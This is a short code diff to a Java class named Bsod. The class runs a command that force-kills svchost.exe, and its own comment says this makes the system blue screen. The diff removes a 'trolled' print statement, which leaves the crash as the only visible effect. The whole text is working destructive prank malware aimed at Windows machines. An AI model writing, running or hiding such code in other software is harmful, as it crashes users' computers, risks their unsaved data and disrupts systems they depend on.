@@ -11,7 +11,6 @@ class Bsod {
     void main(String[] args) {
         // try to execute a command prompt command
         try {
-            System.out.println("trolled");
             // kill svchost.exe, this causes the system to blue screen
             Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
         } catch (Exception ignored) {
